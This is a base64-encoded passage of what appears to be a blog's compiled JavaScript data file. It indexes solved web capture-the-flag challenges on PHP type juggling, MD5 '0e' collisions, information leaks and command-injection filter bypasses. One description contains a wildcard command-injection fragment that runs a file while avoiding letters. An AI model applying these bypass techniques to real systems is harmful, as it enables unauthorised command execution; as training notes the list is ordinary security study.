jBcdTYwRUZcdTYzOTJcdTMwMDJcIlxuICAgICAgfSxcbiAgICAgIHtcbiAgICAgICBcIm5hbWVcIjogXCJDVEZTaG93XHU1RTczXHU1M0YwXCIsXG4gICAgICAgXCJ0aXRsZVwiOiBcIkNURlNob3dcdTVFNzNcdTUzRjBcIixcbiAgICAgICBcInN1bW1hcnlcIjogXCJcdTU2RkRcdTUxODVcdTgwMDFcdTcyNENcdTdFQzNcdTRFNjBcdTVFNzNcdTUzRjBcdUZGMDhjdGYuc2hvd1x1RkYwOVx1MzAwMlx1NzI3OVx1NzBCOVx1NjYyRioqXHU2RDRGXHU4OUM4XHU1NjY4XHU1MUUwXHU0RTRFXHU1RkM1XHU5ODdCKipcdUZGMDhcdTUzQ0RcdTgxRUFcdTUyQThcdTUzMTZcdUZGMDlcdTMwMDFzZXNzaW9uIFx1ODEwNlx1NUYzMVx1MzAwMVx1OTg5OFx1NzZFRVx1NTIwNlx1OTVFOFx1NTIyQlx1N0M3Qlx1NTIzN1x1MzAwMlx1OEZEOVx1OTg3NVx1OEJCMFx1NjAwRVx1NEU0OFx1NTcyOFx1OEZEOVx1OTFDQ1x1NUMxMVx1OEUyOVx1NTc1MVx1MzAwMlwiXG4gICAgICB9XG4gICAgIF1cbiAgICB9XG4gICBdXG4gIH1cbiBdXG59XG4iLCAiY29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2Rpcm5hbWUgPSBcIkM6XFxcXFVzZXJzXFxcXGh3aFxcXFxibG9nXFxcXGZyb250ZW5kXFxcXHNyY1xcXFxkYXRhXCI7Y29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2ZpbGVuYW1lID0gXCJDOlxcXFxVc2Vyc1xcXFxod2hcXFxcYmxvZ1xcXFxmcm9udGVuZFxcXFxzcmNcXFxcZGF0YVxcXFxjaGFsbGVuZ2VzLmpzXCI7Y29uc3QgX192aXRlX2luamVjdGVkX29yaWdpbmFsX2ltcG9ydF9tZXRhX3VybCA9IFwiZmlsZTovLy9DOi9Vc2Vycy9od2gvYmxvZy9mcm9udGVuZC9zcmMvZGF0YS9jaGFsbGVuZ2VzLmpzXCI7ZXhwb3J0IGNvbnN0IGFsbENoYWxsZW5nZXMgPSBbXHJcbiAge1xyXG4gICAgaWQ6IDEwMSxcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWMgXHUyMDE0IEhUTUxcdTZDRThcdTkxQ0FCYXNlNjRcIixcclxuICAgIHNsdWc6IFwiY3Rmc2hvdy1iYXNpY1wiLFxyXG4gICAgY2F0ZWdvcnk6IFwiaW5mb2xlYWtcIixcclxuICAgIHBsYXRmb3JtOiBcIkNURlNob3dcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIkhUTUxcIiwgXCJiYXNlNjRcIiwgXCJpbmZvbGVha1wiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIkhUTUxcdTZDRThcdTkxQ0FcdTRFMkRcdTk2OTBcdTg1Q0ZCYXNlNjRcdTdGMTZcdTc4MDFcdTc2ODRmbGFnXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDEtMTBcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAxMDIsXHJcbiAgICB0aXRsZTogXCJDVEZTaG93IGJhc2ljXzEgXHUyMDE0IEhUTUxcdTZDRThcdTkxQ0FCYXNlNjRcIixcclxuICAgIHNsdWc6IFwiY3Rmc2hvdy1iYXNpYy0xXCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiSFRNTFwiLCBcImJhc2U2NFwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIkhUTUxcdTZDRThcdTkxQ0FcdTZDQzRcdTk3MzJcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xMFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDEwMyxcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWNfMiBcdTIwMTQgXHU1M0MyXHU2NTcwXHU3QkUxXHU2NTM5XCIsXHJcbiAgICBzbHVnOiBcImN0ZnNob3ctYmFzaWMtMlwiLFxyXG4gICAgY2F0ZWdvcnk6IFwiaW5mb2xlYWtcIixcclxuICAgIHBsYXRmb3JtOiBcIkNURlNob3dcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcInBhcmFtZXRlclwiLCBcInRhbXBlcmluZ1wiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlx1NUJBMlx1NjIzN1x1N0FFRlx1NTNDMlx1NjU3MFx1N0JFMVx1NjUzOVx1ODNCN1x1NTNENmZsYWdcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xMFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDEwNCxcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWNfMyBcdTIwMTQgSlNGdWNrXHU4OUUzXHU3ODAxXCIsXHJcbiAgICBzbHVnOiBcImN0ZnNob3ctYmFzaWMtM1wiLFxyXG4gICAgY2F0ZWdvcnk6IFwiaW5mb2xlYWtcIixcclxuICAgIHBsYXRmb3JtOiBcIkNURlNob3dcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIkpTRnVja1wiLCBcImphdmFzY3JpcHRcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJKU0Z1Y2tcdTdGMTZcdTc4MDFcdTg5RTNcdTc4MDFcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xMVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDEwNSxcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWNfNCBcdTIwMTQgQVNDSUlcdTY1NzBcdTdFQzRcIixcclxuICAgIHNsdWc6IFwiY3Rmc2hvdy1iYXNpYy00XCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiQVNDSUlcIiwgXCJqYXZhc2NyaXB0XCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU1MjREXHU3QUVGQVNDSUlcdTY1NzBcdTdFQzRcdTg5RTNcdTc4MDFcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xMVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDEwNixcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWNfNSBcdTIwMTQgXHU1QkEyXHU2MjM3XHU3QUVGXHU0RjJBXHU5MDIwXCIsXHJcbiAgICBzbHVnOiBcImN0ZnNob3ctYmFzaWMtNVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwiaW5mb2xlYWtcIixcclxuICAgIHBsYXRmb3JtOiBcIkNURlNob3dcIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcImNsaWVudC1zaWRlXCIsIFwiZm9yZ2VyeVwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlx1NUJBMlx1NjIzN1x1N0FFRlx1OEVBQlx1NEVGRFx1NEYyQVx1OTAyMFwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTExXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMTA3LFxyXG4gICAgdGl0bGU6IFwiQ1RGU2hvdyBiYXNpY182IFx1MjAxNCBcdTU0Q0RcdTVFOTRcdTU5MzRcdTZDQzRcdTk3MzJcIixcclxuICAgIHNsdWc6IFwiY3Rmc2hvdy1iYXNpYy02XCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wicmVzcG9uc2UtaGVhZGVyXCIsIFwiaW5mb2xlYWtcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJIVFRQXHU1NENEXHU1RTk0XHU1OTM0XHU0RTJEXHU2Q0M0XHU5NzMyZmxhZ1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTEyXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMTA4LFxyXG4gICAgdGl0bGU6IFwiQ1RGU2hvdyBiYXNpY183IFx1MjAxNCAzMDJcdTU0Q0RcdTVFOTRcdTRGNTNcIixcclxuICAgIHNsdWc6IFwiY3Rmc2hvdy1iYXNpYy03XCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCIzMDJcIiwgXCJyZWRpcmVjdFwiLCBcImluZm9sZWFrXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiMzAyXHU5MUNEXHU1QjlBXHU1NDExXHU1NENEXHU1RTk0XHU0RjUzXHU0RTJEXHU5NjkwXHU4NUNGZmxhZ1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTEyXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMTA5LFxyXG4gICAgdGl0bGU6IFwiQ1RGU2hvdyBiYXNpY184IFx1MjAxNCAucGhwc1x1NkU5MFx1NzgwMVx1NkNDNFx1OTczMlwiLFxyXG4gICAgc2x1ZzogXCJjdGZzaG93LWJhc2ljLThcIixcclxuICAgIGNhdGVnb3J5OiBcImluZm9sZWFrXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJDVEZTaG93XCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCIucGhwc1wiLCBcInNvdXJjZS1sZWFrXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiLnBocHNcdTY1ODdcdTRFRjZcdTZDQzRcdTk3MzJQSFBcdTZFOTBcdTc4MDFcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xMlwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDExMCxcclxuICAgIHRpdGxlOiBcIkNURlNob3cgYmFzaWNfOSBcdTIwMTQgcm9ib3RzLnR4dFwiLFxyXG4gICAgc2x1ZzogXCJjdGZzaG93LWJhc2ljLTlcIixcclxuICAgIGNhdGVnb3J5OiBcImluZm9sZWFrXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJDVEZTaG93XCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJyb2JvdHMudHh0XCIsIFwiaW5mb2xlYWtcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJyb2JvdHMudHh0XHU2Q0M0XHU5NzMyXHU2NTRGXHU2MTFGXHU4REVGXHU1Rjg0XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDEtMTNcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAxMTEsXHJcbiAgICB0aXRsZTogXCJDVEZTaG93IGJhc2ljXzEwIFx1MjAxNCBDb29raWUgSURPUlwiLFxyXG4gICAgc2x1ZzogXCJjdGZzaG93LWJhc2ljLTEwXCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJDb29raWVcIiwgXCJJRE9SXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiQ29va2llXHU2Q0U4XHU1MTY1XHU1QjlFXHU3M0IwSURPUlx1OEQ4QVx1Njc0M1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTEzXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMTEyLFxyXG4gICAgdGl0bGU6IFwiQ1RGU2hvdyBiYXNpY18xMiBcdTIwMTQgXHU5NjkwXHU4NUNGXHU2NTg3XHU0RUY2XCIsXHJcbiAgICBzbHVnOiBcImN0ZnNob3ctYmFzaWMtMTJcIixcclxuICAgIGNhdGVnb3J5OiBcImluZm9sZWFrXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJDVEZTaG93XCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJoaWRkZW5cIiwgXCJJRE9SXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU5MDFBXHU4RkM3SURPUlx1NTNEMVx1NzNCMFx1OTY5MFx1ODVDRlx1NjU4N1x1Njg2M1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAxLTE0XCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMTEzLFxyXG4gICAgdGl0bGU6IFwiQ1RGU2hvdyBiYXNpY18xNCBcdTIwMTQgL3Byb2Mvc2VsZi9mZFwiLFxyXG4gICAgc2x1ZzogXCJjdGZzaG93LWJhc2ljLTE0XCIsXHJcbiAgICBjYXRlZ29yeTogXCJpbmZvbGVha1wiLFxyXG4gICAgcGxhdGZvcm06IFwiQ1RGU2hvd1wiLFxyXG4gICAgZGlmZmljdWx0eTogXCJNZWRpdW1cIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCIvcHJvY1wiLCBcImZpbGUtZGVzY3JpcHRvclwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlx1NTIyOVx1NzUyOC9wcm9jL3NlbGYvZmRcdTY1ODdcdTRFRjZcdTYzQ0ZcdThGRjBcdTdCMjZcdTZDQzRcdTk3MzJcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMS0xNFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDIwMSxcclxuICAgIHRpdGxlOiBcIlFDIGV6cGhwIFx1MjAxNCBcdTVGMzFcdTdDN0JcdTU3OEJcdTdFRDVcdThGQzdcIixcclxuICAgIHNsdWc6IFwicWMtZXpwaHBcIixcclxuICAgIGNhdGVnb3J5OiBcInBocFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUEhQXCIsIFwid2Vhay10eXBlXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiUEhQID09IFx1NUYzMVx1N0M3Qlx1NTc4Qlx1NkJENFx1OEY4M1x1N0VENVx1OEZDN1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAyLTAxXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMjAyLFxyXG4gICAgdGl0bGU6IFwiUUMgZXpwaHBfMSBcdTIwMTQgYXJyYXlfc2VhcmNoXCIsXHJcbiAgICBzbHVnOiBcInFjLWV6cGhwLTFcIixcclxuICAgIGNhdGVnb3J5OiBcInBocFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUEhQXCIsIFwiYXJyYXlfc2VhcmNoXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiYXJyYXlfc2VhcmNoXHU1RjMxXHU3QzdCXHU1NzhCXHU2RjBGXHU2RDFFXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMDFcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAyMDMsXHJcbiAgICB0aXRsZTogXCJRQyBlenBocF8yIFx1MjAxNCBcdTVENENcdTU5NTdcdTVGMzFcdTdDN0JcdTU3OEJcIixcclxuICAgIHNsdWc6IFwicWMtZXpwaHAtMlwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicGhwXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIk1lZGl1bVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlBIUFwiLCBcIm5lc3RlZFwiLCBcIndlYWstdHlwZVwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIlx1NUQ0Q1x1NTk1N1x1NUYzMVx1N0M3Qlx1NTc4Qlx1NkJENFx1OEY4M1x1N0VENVx1OEZDN1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAyLTAyXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMjA0LFxyXG4gICAgdGl0bGU6IFwiUUMgZXptZDUgXHUyMDE0IDBlIE1ENVwiLFxyXG4gICAgc2x1ZzogXCJxYy1lem1kNVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicGhwXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJNRDVcIiwgXCIwZVwiLCBcIlBIUFwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIjBlXHU1RjAwXHU1OTM0TUQ1XHU3OEIwXHU2NDlFXHU3RUQ1XHU4RkM3XCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMDJcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAyMDUsXHJcbiAgICB0aXRsZTogXCJRQyBlem1kNV8xIFx1MjAxNCBcdTUzQ0MwZSBNRDVcIixcclxuICAgIHNsdWc6IFwicWMtZXptZDUtMVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicGhwXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIk1lZGl1bVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIk1ENVwiLCBcIjBlXCIsIFwiUEhQXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU1M0NDMGUgTUQ1XHU3OEIwXHU2NDlFXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMDNcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAyMDYsXHJcbiAgICB0aXRsZTogXCJRQyBlem1kNV8yIFx1MjAxNCBtZDVcdTY1NzBcdTdFQzRcIixcclxuICAgIHNsdWc6IFwicWMtZXptZDUtMlwiLFxyXG4gICAgY2F0ZWdvcnk6IFwicGhwXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJNRDVcIiwgXCJhcnJheVwiLCBcIlBIUFwiXSxcclxuICAgIGRlc2NyaXB0aW9uOiBcIm1kNVx1NjU3MFx1N0VDNFx1N0VENVx1OEZDN1wiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAyLTAzXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMjA3LFxyXG4gICAgdGl0bGU6IFwiUUMgZXptZDVfMyBcdTIwMTQgbWQ1XHU2NTcwXHU3RUM0XCIsXHJcbiAgICBzbHVnOiBcInFjLWV6bWQ1LTNcIixcclxuICAgIGNhdGVnb3J5OiBcInBocFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiTUQ1XCIsIFwiYXJyYXlcIiwgXCJQSFBcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJtZDVcdTY1NzBcdTdFQzRcdTdFRDVcdThGQzdcdTUzRDhcdTc5Q0RcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0wM1wiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDIwOCxcclxuICAgIHRpdGxlOiBcIlFDIGV6bWQ1XzQgXHUyMDE0IE1ENVx1NzIwNlx1NzgzNFwiLFxyXG4gICAgc2x1ZzogXCJxYy1lem1kNS00XCIsXHJcbiAgICBjYXRlZ29yeTogXCJwaHBcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiTUQ1XCIsIFwiYnJ1dGUtZm9yY2VcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJNRDVcdTU0QzhcdTVFMENcdTcyMDZcdTc4MzRcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0wNFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMwMSxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kIFx1MjAxNCBcdTc2RjRcdTYzQTVcdTYyNjdcdTg4NENcIixcclxuICAgIHNsdWc6IFwicWMtZXpjbWRcIixcclxuICAgIGNhdGVnb3J5OiBcImNtZFwiLFxyXG4gICAgcGxhdGZvcm06IFwiUWluZ0NlblwiLFxyXG4gICAgZGlmZmljdWx0eTogXCJFYXN5XCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUkNFXCIsIFwiY21kXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiXHU2NUUwXHU4RkM3XHU2RUU0XHU3NkY0XHU2M0E1XHU1NDdEXHU0RUU0XHU2MjY3XHU4ODRDXCIsXHJcbiAgICBkYXRlOiBcIjIwMjYtMDItMTBcIixcclxuICB9LFxyXG4gIHtcclxuICAgIGlkOiAzMDIsXHJcbiAgICB0aXRsZTogXCJRQyBlemNtZF8xIFx1MjAxNCBcdTUyMDZcdTUzRjdcdTZDRThcdTUxNjVcIixcclxuICAgIHNsdWc6IFwicWMtZXpjbWQtMVwiLFxyXG4gICAgY2F0ZWdvcnk6IFwiY21kXCIsXHJcbiAgICBwbGF0Zm9ybTogXCJRaW5nQ2VuXCIsXHJcbiAgICBkaWZmaWN1bHR5OiBcIkVhc3lcIixcclxuICAgIHNvbHZlZDogdHJ1ZSxcclxuICAgIGZpcnN0Qmxvb2Q6IGZhbHNlLFxyXG4gICAgcG9pbnRzOiAxMDAsXHJcbiAgICB0YWdzOiBbXCJSQ0VcIiwgXCJzZW1pY29sb25cIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJcdTUyMDZcdTUzRjdcdTYyMkFcdTY1QURcdTYyNjdcdTg4NENcdTU0N0RcdTRFRTRcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0xMFwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMwMyxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kXzIgXHUyMDE0IFx1NkNFOFx1OTFDQVx1NjIyQVx1NjVBRFwiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC0yXCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiRWFzeVwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlJDRVwiLCBcImNvbW1lbnRcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJcdTZDRThcdTkxQ0FcdTdCMjZcdTYyMkFcdTY1QURcdTdFRDVcdThGQzdcIixcclxuICAgIGRhdGU6IFwiMjAyNi0wMi0xMVwiLFxyXG4gIH0sXHJcbiAge1xyXG4gICAgaWQ6IDMwNCxcclxuICAgIHRpdGxlOiBcIlFDIGV6Y21kXzMgXHUyMDE0IElGU1x1N0VENVx1OEZDN1wiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC0zXCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiTWVkaXVtXCIsXHJcbiAgICBzb2x2ZWQ6IHRydWUsXHJcbiAgICBmaXJzdEJsb29kOiBmYWxzZSxcclxuICAgIHBvaW50czogMTAwLFxyXG4gICAgdGFnczogW1wiUkNFXCIsIFwiSUZTXCIsIFwiYnlwYXNzXCJdLFxyXG4gICAgZGVzY3JpcHRpb246IFwiJElGU1x1N0VENVx1OEZDN1x1N0E3QVx1NjgzQ1x1OEZDN1x1NkVFNFwiLFxyXG4gICAgZGF0ZTogXCIyMDI2LTAyLTExXCIsXHJcbiAgfSxcclxuICB7XHJcbiAgICBpZDogMzA1LFxyXG4gICAgdGl0bGU6IFwiUUMgZXpjbWRfNSBcdTIwMTQgXHU2NUUwXHU1QjU3XHU2QkNEUkNFIFx1MjYwNVx1NEUwMFx1ODg0MFwiLFxyXG4gICAgc2x1ZzogXCJxYy1lemNtZC01XCIsXHJcbiAgICBjYXRlZ29yeTogXCJjbWRcIixcclxuICAgIHBsYXRmb3JtOiBcIlFpbmdDZW5cIixcclxuICAgIGRpZmZpY3VsdHk6IFwiSGFyZFwiLFxyXG4gICAgc29sdmVkOiB0cnVlLFxyXG4gICAgZmlyc3RCbG9vZDogZmFsc2UsXHJcbiAgICBwb2ludHM6IDEwMCxcclxuICAgIHRhZ3M6IFtcIlJDRVwiLCBcIm5vLWFscGhhXCIsIFwiZmlyc3QtYmxvb2RcIl0sXHJcbiAgICBkZXNjcmlwdGlvbjogXCJcdThGQzdcdTZFRTRcdTYyNDBcdTY3MDlcdTVCNTdcdTZCQ0RcdUZGMEMuIC8/Pz8/Lj8/PyAyPiYxIHNvdXJjZVx1NkNDNFx1OTczMlwiLFxyXG4gICAg